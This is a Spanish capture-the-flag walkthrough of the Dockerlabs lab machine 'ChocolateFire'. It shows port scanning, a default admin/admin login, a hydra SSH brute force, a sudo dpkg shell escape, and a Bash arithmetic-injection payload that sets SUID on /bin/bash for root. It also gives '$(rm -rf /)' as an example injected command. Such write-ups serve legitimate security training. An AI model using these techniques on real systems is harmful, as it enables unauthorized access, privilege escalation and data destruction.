
# Writeup Template: Maquina `[ ChocolateFire ]`

- Tags: #ChocolateFire
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina ChocolateFire](https://mega.nz/file/wWslhSQS#jmz3PksTmtOaitgKwS7dcgc8Vd7o6pECPViav9clzwA) Laboratorio orientado a pruebas de pentesting en servidores web con autenticación insegura.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x chocolatefire.zip
sudo bash auto_deploy.sh chocolatefire.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,5222,5223,5262,5263,5269,5270,5275,5276,7070,7777,9090 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh                OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
5222/tcp open  jabber
5223/tcp open  ssl/hpvirtgrp?
5262/tcp open  jabber
5263/tcp open  ssl/unknown
5269/tcp open  xmpp
5270/tcp open  xmp?
5275/tcp open  jabber
5276/tcp open  ssl/unknown
7070/tcp open  http 
7777/tcp open  socks5
9090/tcp open  hadoop-tasktracker Apache Hadoop

```
---

## Enumeracion de [Servicio Web Principal]
El servicio detectado en el puerto **9090/tcp** como **hadoop-tasktracker** es parte del ecosistema **Apache Hadoop**, específicamente relacionado con el procesamiento distribuido de datos. Aquí está la explicación detallada:
### 1. Qué es Hadoop TaskTracker:
- **Función principal:**  
    Es un componente del sistema **MapReduce en Hadoop 1.x** (versiones antiguas). Su rol es ejecutar **tareas de procesamiento** (como operaciones _Map_ o _Reduce_) asignadas por el **JobTracker** (el coordinador central).
- **Arquitectura esclavo:**  
    Opera en nodos esclavos (_worker nodes_) del clúster Hadoop, gestionando recursos locales y ejecutando fragmentos de trabajo en paralelo.
### 2. Contexto técnico:
- **Hadoop 1.x vs. 2.x+:**  
    En versiones modernas (Hadoop 2.x+ con **YARN**), el _TaskTracker_ fue reemplazado por **NodeManager** y el _JobTracker_ por **ResourceManager**. Si detectas este servicio, sugiere un clúster Hadoop antiguo o configurado en modo "clásico".
- **Puerto 9090:**  
    Usualmente es un puerto personalizado. Por defecto, Hadoop usa:
    - TaskTracker: **50060** (HTTP) y **8021** (IPC).
    - La presencia en *9090* indica configuración no estándar.
### 3. Riesgos de seguridad:
- **Exposición de datos:**  
    Si el puerto está abierto a redes no confiables, podría:
    - Permitir fuga de información del clúster (tareas, nodos, logs).
    - Ser vector para ataques si existen vulnerabilidades (ej: ejecución remota de código).
- **Buenas prácticas:**  
    Restringir acceso solo a IPs internas del clúster o usar VPN/firewalls.

direccion **URL** del servicio:
```bash
http://172.17.0.2:9090/login.jsp?url=%2Findex.jsp
```

Ahora tenemos un panel de autentificacion, Pero probando credenciales por defecto ganamos acceso:
```bash
username: admin
password: admin
```

No se tuvo que realizar ataques de fuerza bruta, Ya que el servicio usa credenciales por defecto:
Ahora estamos en el panel administrativo:
```bash
http://172.17.0.2:9090/index.jsp
```

En el apartado de **Usarios** tenemos los siguientes:
```bash
http://172.17.0.2:9090/user-summary.jsp

5laahb
admin
chocolatitochingon
```
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
De mientras que tenemos un nombre de usuario realizaremos un ataque de fuerza bruta sobre el servicio **ssh** que esta expluesto en lo que seguimos con la enumeracion:
```bash
hydra -l chocolatitochingon -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://172.17.0.2
```
Tambien en caso de que no puedamos encontrar credenciales podemos subir un plugin malicioso
Con **hydra** tuvimos exito encontramos credenciales validas para un usuario del sistema para **ssh**
```bash
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: chocolatitochingon   password: chocolate
```
### Intrusion
En esta caso la intrusion sera realizado por **ssh** ya que logramos ver usuarios desde el panel administrativo
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh chocolatitochingon@172.17.0.2 # ( chocolate )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Enumerando los usuarios del sistema:
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
chocolatitochingon:x:1000:1000:chocolatitochingon,,,:/home/chocolatitochingon:/bin/bash
pinguinacio:x:1001:1001::/home/pinguinacio:/bin/bash
```

### Explotacion de Privilegios

###### Usuario `[ chocolatitochingon ]`:
Listamos los permisos para este usuario:
```bash
User chocolatitochingon may run the following commands on 9cf682416d0b:
    (pinguinacio) NOPASSWD: /usr/bin/dpkg
```

Explotamos el privilegio de este usuario:
```bash
sudo -u pinguinacio /usr/bin/dpkg -l # Primero ejecutamos
!/bin/bash # Despues
```

###### Usuario `[ pinguinacio ]`:
Listando los archivos para este usuario tenemos un script **script.sh** que pertenece al usuario **root**, pero si listamos los permisos para este usaurio vemos que podemos ejecutarlo como **root**
```bash
sudo -l

User pinguinacio may run the following commands on 9cf682416d0b:
    (ALL) NOPASSWD: /bin/bash /home/pinguinacio/script.sh
```

Lo ejecutamos para ver como es que funciona:
```bash
sudo -u root /bin/bash /home/pinguinacio/script.sh
```

Vemos que realizar un **backup** de lo que exista en el derectorio **/opt**, Asi que tenemos de ver la manera de colar algo para poder ganar privilegios de **root**
```bash
Ingrese el número 1 para hacer un backup de tus archivos: 1
El número ingresado es igual a 1
Intentando copiar archivos al directorio /opt...
Copia completada.
```

Revisando el codigo del script
```bash
#!/bin/bash

read -rp "Ingrese el número 1 para hacer un backup de tus archivos: " numero

if [[ "$numero" -eq 1 ]]
then
    echo "El número ingresado es igual a 1"
    echo "Intentando copiar archivos al directorio /opt..."
    cp * /opt
    echo "Copia completada."
else
    echo "El número ingresado no es igual a 1. No se realizará ninguna operación."
fi
```

El script **es críticamente vulnerable** a inyección de comandos debido a cómo se evalúa `$numero` en el condicional `[[ ... ]]`.
- **Mecanismo de ataque**:  
    En Bash, las expresiones dentro de `[[ ... ]]` permiten **sustitución de comandos** (`$()`) y **expansión aritmética** cuando se usan operadores como `-eq`.
- **Payload de explotación**:  
    `a[$()]+42` contiene:
    - `$()`: Ejecuta cualquier comando dentro (ej: `$(rm -rf /)`).
    - `a[]`: Array no definido (equivale a `0` en operaciones aritméticas).
    - `+42`: Suma para que la expresión sea `42` (no requiere que sea `1`).
    -  El operador `-eq` fuerza una evaluación aritmética en Bash.
	- Cualquier comando dentro de `$()` se ejecuta **antes** de la comparación numérica.
	- **No hay validación de entrada**: El script confía ciegamente en la entrada del usuario.
Ahora el comando que le inyectaremos es el siguiente para otorgar privilegios **SUID** a la bash de **root**
```bash
a[$(chmod u+s /bin/bash)]+42
```

Explotacion
```bash
Ingrese el número 1 para hacer un backup de tus archivos: a[$(chmod u+s /bin/bash)]+42
El número ingresado no es igual a 1. No se realizará ninguna operación.
```

Aunque fallo el script hemos logrado nuestro objetivo, Revisamos los permisos de la **bash** de **root**
```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Aug  4  2021 /bin/bash
```

Ahora migramos a **root**
```bash
# Comando para escalar al usuario: ( root )
bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.1# whoami
root
```